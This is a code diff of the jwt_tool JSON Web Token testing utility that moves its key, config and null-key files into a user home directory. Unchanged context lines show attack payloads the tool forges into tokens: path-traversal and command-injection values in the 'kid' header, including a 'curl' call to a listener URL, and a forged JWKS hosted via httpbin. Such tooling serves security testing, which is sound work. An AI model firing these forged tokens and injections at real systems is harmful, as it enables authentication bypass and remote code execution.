@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.4 (08_07_2021)
+# JWT_Tool version 2.2.5 (26_01_2022)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.4"
+jwttoolvers = "2.2.5"
 import ssl
 import sys
 import os
@@ -56,11 +56,11 @@ def cprintc(textval, colval):
         cprint(textval, colval)
 
 def createConfig():
-    privKeyName = "jwttool_custom_private_RSA.pem"
-    pubkeyName = "jwttool_custom_public_RSA.pem"
-    ecprivKeyName = "jwttool_custom_private_EC.pem"
-    ecpubkeyName = "jwttool_custom_public_EC.pem"
-    jwksName = "jwttool_custom_jwks.json"
+    privKeyName = path+"/jwttool_custom_private_RSA.pem"
+    pubkeyName = path+"/jwttool_custom_public_RSA.pem"
+    ecprivKeyName = path+"/jwttool_custom_private_EC.pem"
+    ecpubkeyName = path+"/jwttool_custom_public_EC.pem"
+    jwksName = path+"/jwttool_custom_jwks.json"
     if (os.path.isfile(privKeyName)) and (os.path.isfile(pubkeyName)) and (os.path.isfile(ecprivKeyName)) and (os.path.isfile(ecpubkeyName)) and (os.path.isfile(jwksName)):
         cprintc("Found existing Public and Private Keys - using these...", "cyan")
         origjwks = open(jwksName, "r").read()
@@ -89,6 +89,7 @@ def createConfig():
         with open(jwksName, 'w') as test_jwks_out:
                 test_jwks_out.write(fulljwks)
         jwks_b64 = base64.b64encode(fulljwks.encode('ascii'))
+    proxyHost = "127.0.0.1"
     config = configparser.ConfigParser(allow_no_value=True)
     config.optionxform = str
     config['crypto'] = {'pubkey': pubkeyName,
@@ -97,7 +98,7 @@ def createConfig():
         'ecprivkey': ecprivKeyName,
         'jwks': jwksName}
     config['services'] = {'jwt_tool_version': jwttoolvers,
-        '# To disable the proxy option set this value to: False (no quotes)': None, 'proxy': 'localhost:8080',
+        '# To disable the proxy option set this value to: False (no quotes). For Docker installations with a Windows host OS set this to: "host.docker.internal:8080"': None, 'proxy': proxyHost+':8080',
         '# Set this to the URL you are hosting your custom JWKS file (jwttool_custom_jwks.json) - your own server, or maybe use this cheeky reflective URL (https://httpbin.org/base64/{base64-encoded_JWKS_here})': None,
         'jwksloc': 'https://httpbin.org/base64/'+jwks_b64.decode(),
         '# Set this to the base URL of a Collaborator server, somewhere you can read live logs, a Request Bin etc.': None, 'httplistener': ''}
@@ -1441,32 +1442,32 @@ def scanModePlaybook():
         origkid = False
     # kid inject: blank field, sign with null
     newheadDict, newHeadB64 = injectheaderclaim("kid", "")
-    key = open("null.txt").read()
+    key = open(path+"/null.txt").read()
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with blank kid")
     # kid inject: path traversal - known path - check for robots.txt, sign with variations of location
     newheadDict, newHeadB64 = injectheaderclaim("kid", "../../../../../../dev/null")
-    key = open("null.txt").read()
+    key = open(path+"/null.txt").read()
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"[path traversal]/dev/null\"")
     newheadDict, newHeadB64 = injectheaderclaim("kid", "/dev/null")
-    key = open("null.txt").read()
+    key = open(path+"/null.txt").read()
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/dev/null\"")
     # kid inject: path traversal - bad path - sign with null
     newheadDict, newHeadB64 = injectheaderclaim("kid", "/invalid_path")
-    key = open("null.txt").read()
+    key = open(path+"/null.txt").read()
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - null-signed with kid=\"/invalid_path\"")
     # kid inject: RCE - sign with null
     newheadDict, newHeadB64 = injectheaderclaim("kid", "|sleep 10")
-    key = open("null.txt").read()
+    key = open(path+"/null.txt").read()
     newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
     jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - SLEEP 10 (did this request pause?)")
     if config['services']['httplistener']:
         injectUrl = config['services']['httplistener']+"/RCE_in_kid"
         newheadDict, newHeadB64 = injectheaderclaim("kid", "| curl "+injectUrl)
-        key = open("null.txt").read()
+        key = open(path+"/null.txt").read()
         newSig, newContents = signTokenHS(newheadDict, paylDict, key, 256)
         jwtOut(newContents+"."+newSig, "Injected kid claim - RCE attempt - curl "+injectUrl+" (did this URL get accessed?)")
     # kid inject: SQLi explicit value
@@ -1879,7 +1880,12 @@ if __name__ == '__main__':
     args = parser.parse_args()
     if not args.bare:
         printLogo()
-    path = sys.path[0]
+    try:
+        path = os.path.expanduser("~/.jwt_tool")
+        if not os.path.exists(path):
+            os.makedirs(path)
+    except:
+        path = sys.path[0]
     logFilename = path+"/logs.txt"
     configFileName = path+"/jwtconf.ini"
     config = configparser.ConfigParser()
@@ -1894,7 +1900,7 @@ if __name__ == '__main__':
         os.rename(configFileName, path+"/old_("+config['services']['jwt_tool_version']+")_jwtconf.ini")
         createConfig()
         exit(1)
-    with open('null.txt', 'w') as nullfile:
+    with open(path+"/null.txt", 'w') as nullfile:
         pass
     findJWT = ""
     if args.targeturl:
